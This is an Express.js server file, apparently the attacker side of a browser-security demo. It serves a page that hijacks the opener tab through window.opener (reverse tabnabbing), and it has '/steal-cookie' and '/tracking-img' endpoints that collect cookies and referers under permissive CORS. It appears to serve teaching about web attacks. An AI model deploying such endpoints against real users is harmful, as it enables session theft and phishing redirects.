import bodyParser from 'body-parser';
import express from 'express';

const app = express();
app.disable('etag');
// parse application/json
app.use(bodyParser.json())

app.get('/', (req, res) => {
  res.setHeader('content-type', 'text/html');
  res.send(`
    <html>
      <body>
        <p>Hello from server #2!</p>
        <p>This page modified the DOM of the opener page. Go back to the tab to see what changed </p>

      </body>

      <script>
        if (window.opener) {
          window.opener.location = 'https://google.com';

          // In older browser, you could also do something like this.
          // No longer possible in modern browsers due to the default same-origin policy
          div = window.opener.document.createElement('div')
          div.innerText = 'APPENDED SOMETHING FROM OPENED LINK'
          window.opener.document.body.appendChild(div)
        }
      </script>
    </html>
  `)
});

app.options('/steal-cookie', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'content-type');
  res.send('Ok');
});

app.get('/phishing-page', (req, res) => {
  res.send('Hello World! from Server #2')
})

app.get('/tracking-img', (req, res) => {
  const cookie = req.headers.cookie;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('content-type', 'image/svg+xml');
  res.setHeader('stolen-cookie', cookie ?? 'no cookie');
  res.setHeader('stolen-referer', req.headers.referer ?? 'n/a');
  res.setHeader('timestamp', new Date().toISOString());
  res.setHeader('Set-cookie', `last_image_request="This image was last requested at: ${new Date().toISOString()} from ${req.headers.referer}"; Path=/; Port=8081`);
  res.send(`invalid img`)
});


app.post('/steal-cookie', (req, res) => {
  const cookie = req.body.cookies;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'content-type');
  res.json({
    stolenCookies: cookie,
  });
});

app.listen(8081, () => {
  console.log('Server is running on port 8081');
});
